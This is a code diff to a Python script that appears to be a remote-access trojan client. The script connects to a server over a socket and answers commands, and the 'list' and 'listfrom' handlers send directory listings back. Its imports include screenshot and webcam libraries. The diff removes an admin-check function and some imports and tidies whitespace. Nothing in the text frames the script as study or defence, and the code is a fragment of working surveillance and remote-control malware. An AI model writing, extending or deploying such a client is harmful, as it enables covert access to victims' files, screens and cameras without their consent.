@@ -2,20 +2,12 @@ import os
 import socket
 import pyscreenshot
 from tkinter import messagebox
-import warnings
 import traceback
+import warnings
 import tkinter
 import pickle
-import shutil
-import ctypes
 import sys
 import cv2
-
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
 # Connect to server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -39,7 +31,7 @@ while True:
     if command == "list":
         files = os.listdir()
         sock.send(str(files).encode())
-    
+
     elif command == "listfrom":
         fromdir = sock.recv(5000).decode()
         files = os.listdir(fromdir)
